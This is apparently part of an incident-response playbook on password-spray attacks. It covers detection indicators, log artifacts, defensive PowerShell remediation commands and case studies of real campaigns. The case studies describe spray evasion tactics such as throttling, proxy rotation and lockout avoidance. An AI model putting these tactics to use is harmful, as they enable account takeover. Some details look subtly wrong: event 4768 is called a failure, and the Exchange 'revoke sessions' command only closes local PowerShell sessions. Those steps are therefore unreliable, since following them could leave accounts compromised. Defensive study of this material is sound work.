### Indicators of Compromise (IOCs)

**Network:**
- Multiple failed authentication attempts clustered across services (AD, RDP, SSH, OWA) within 1-24 hour window
- Failed attempts from unusual geographic locations (especially distributed across multiple countries in short timespan)
- Single source IP OR distributed IPs (residential proxies) repeatedly testing different usernames

**Log Patterns:**
- Event ID 4625 (Windows) cluster: 50+ failures in 1 hour from same source IP across multiple targets
- Kerberos 4771: Pre-auth failures; harder to detect than NTLM 4625
- SSH auth.log: Repeated "Invalid user" or "Failed password" messages
- OWA IIS logs: 401 (Unauthorized) errors in bulk

**Behavioral:**
- Successful login immediately after spray attempt (same IP or correlated source)
- Login from impossible geography (user in NYC signs in from Russia 30 minutes later)
- Access to sensitive resources within 1 hour of successful spray compromise

### Forensic Artifacts

**Windows Event Logs:**
- Event ID 4625 (Failed Logon) - BadPasswordCount increases
- Event ID 4624 (Successful Logon) - After successful spray
- Event ID 4768 (Kerberos TGT Request Failure) - Kerberos-based spray
- BadPwdCount attribute on user object (use `Get-ADUser`)

**SIEM Logs:**
- SigninLogs (Entra ID): Failed auth attempts with result codes 50055, 50056
- SecurityEvent (AD): 4625 aggregated by UserName, SourceIP
- Syslog (SSH): "Invalid user" or "Failed password for invalid user" patterns

**System State:**
- User accounts with high BadPwdCount (sign of spray)
- Users with "Account Locked Out" status
- Recent password changes (attacker may reset password post-compromise)

### Response Procedures

**1. Isolate Compromised Services**

**Command (Disable Compromised User Account Immediately):**
```powershell
# Disable in AD
Disable-ADAccount -Identity "john.smith"

# Disable in Entra ID
Update-MgUser -UserId "john.smith@company.com" -AccountEnabled:$false

# Disable RDP access
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
```

**Command (Block Attacker IP):**
```powershell
# Windows Firewall
New-NetFirewallRule -DisplayName "Block Attacker IP" -Direction Inbound -Action Block -RemoteAddress "192.0.2.100"

# Firewall/NSG (Azure)
New-AzNetworkSecurityRuleConfig -Name "BlockAttackerIP" -Protocol * -SourcePortRange * -DestinationPortRange * -SourceAddressPrefix "192.0.2.100" -DestinationAddressPrefix * -Access Deny -Priority 100
```

---

**2. Investigate Lateral Movement**

**Command (Find All Logins by Compromised Account):**
```powershell
# Find all logons by john.smith in past 24 hours
Get-EventLog -LogName Security -InstanceId 4624 -After (Get-Date).AddDays(-1) | Where-Object {$_.Message -like "*john.smith*"}

# Sentinel query
SigninLogs
| where UserPrincipalName == "john.smith@company.com"
| where TimeGenerated > ago(24h)
| sort by TimeGenerated desc
```

**Command (Find Privilege Escalation or Sensitive Access):**
```powershell
# Check if john.smith was added to privileged groups
Get-EventLog -LogName Security -InstanceId 4728 -After (Get-Date).AddDays(-1) | Where-Object {$_.Message -like "*john.smith*"}

# Check for file/share access
Get-EventLog -LogName Security -InstanceId 4656 -After (Get-Date).AddDays(-1) | Where-Object {$_.Message -like "*john.smith*"}
```

---

**3. Remediation**

**Command (Force Password Reset):**
```powershell
# AD
Set-ADUser -Identity "john.smith" -ChangePasswordAtLogon $true

# Entra ID
Update-MgUser -UserId "john.smith@company.com" -ForceChangePasswordNextSignIn $true
```

**Command (Revoke All Sessions):**
```powershell
# Entra ID - Invalidate all refresh tokens
Invoke-MgGraphRequest -Method POST -Uri "/users/john.smith@company.com/invalidateAllRefreshTokens"

# Exchange Online - Revoke sessions
Get-PSSession | Where-Object {$_.State -eq "Opened"} | Remove-PSSession
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-002] Anonymous LDAP Binding | Enumerate valid usernames |
| **2** | **Reconnaissance** | [REC-CLOUD-002] ROADtools Entra ID | Discover cloud endpoints |
| **3** | **Credential Access** | **[CA-BRUTE-002]** | **Distributed password spray across services** |
| **4** | **Initial Access** | Successful login to AD/RDP/VPN | Attacker gains foothold |
| **5** | **Privilege Escalation** | [PE-VALID-002] Computer Account Quota Abuse | Escalate from user to domain admin |
| **6** | **Persistence** | [PE-ACCTMGMT-001] App Registration | Create persistent backdoor access |
| **7** | **Impact** | Ransomware deployment, data exfil | Full environment compromise |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: RansomHub Ransomware via RDP Spray (June 2025)

- **Target:** Mid-sized manufacturing company, 300 employees
- **Attack Vector:** Exposed RDP on port 3389 (internet-facing)
- **Timeline:** 4 hours spray → 1 hour to DC compromise → 118 hours to ransomware
- **Spray Method:** 
  - 500 usernames, 10 common passwords
  - 4-hour spray window (1 attempt per minute)
  - 5,000 total attempts
  - Hit rate: 3 successful credentials (admin, sysadmin, backup account)
- **Post-Compromise:**
  - Lateral movement via mimikatz credential dumping
  - Domain controller compromise via Kerberoasting
  - Shadow copy deletion, event log clearing
  - RansomHub binary deployed; 500+ servers encrypted
  - Ransom demand: $2.5M (attacker asked for $1.2M after negotiation)
- **Detection Failure:** Company had no aggregated RDP logging; alerts went unnoticed
- **Reference:** [WebAsha - RansomHub RDP Spray Case Study](https://www.webasha.com/blog/how-do-rdp-servers-get-hacked-password-spray-attack-leads-to-ransomhub-ransomware-breach-case-study)

### Example 2: APT28 Multi-Month Distributed Campaign (2024)

- **Target:** NATO military organizations, European governments (9+ countries)
- **Timeline:** September 2023 - February 2024 (6 months)
- **Scope:** 5,000+ targeted usernames across military and government sectors
- **Spray Method:**
  - Distributed across 1,000+ proxy IPs
  - 3-4 authentication attempts per hour per account
  - Rotated passwords weekly (Winter2023, Winter2023-v2, Spring2024)
  - Targeted sensitive accounts: service accounts, admins, military liaisons
- **Success:** 50+ accounts compromised (0.1-0.5% success rate)
- **Post-Compromise:**
  - Intelligence gathering on NATO operations
  - Exfiltration of classified defense documents
  - Lateral movement to partner organization networks
  - Persistence via hidden admin account creation
- **Detection:** Months of activity undetected; discovered only via threat intelligence sharing
- **Reference:** [Microsoft Security Blog - APT28 Password Spray Campaigns](https://www.microsoft.com/en-us/security/blog/)

### Example 3: Peach Sandstorm (HOLMIUM) - Massive Campaign (2023)

- **Target:** 10,000+ organizations across US, Europe, Middle East (government, finance, healthcare)
- **Attack Scope:** Simultaneous spray against Azure AD, on-premises AD, VPN, OWA
- **Spray Statistics:** 
  - 250+ successful account compromises tracked
  - Average hit rate: 0.5% (1 success per 200 attempts)
  - Spray duration: 2-4 weeks per password (low and slow)
  - IP rotation: 50+ different geographic sources per organization
- **Defense Bypass:**
  - Throttled to 1 attempt per user per day (distributed over weeks)
  - Avoided triggering Smart Lockout in Azure AD
  - Separated AD and Azure sprays temporally (days apart)
- **Impact:**
  - Government agencies lost classified documents
  - Financial institutions compromised in supply-chain attacks
  - Healthcare providers exposed patient data (HIPAA breach)
  - Estimated impact: $billions in damages, legal fines
- **Reference:** [Microsoft Digital Defense Report 2023 - Peach Sandstorm](https://www.microsoft.com/en-us/security/blog/2023/09/14/peach-sandstorm-password-spray-campaigns-enable-intelligence-collection-against-thousands-of-organizations-in-the-us-and-eu/)

---
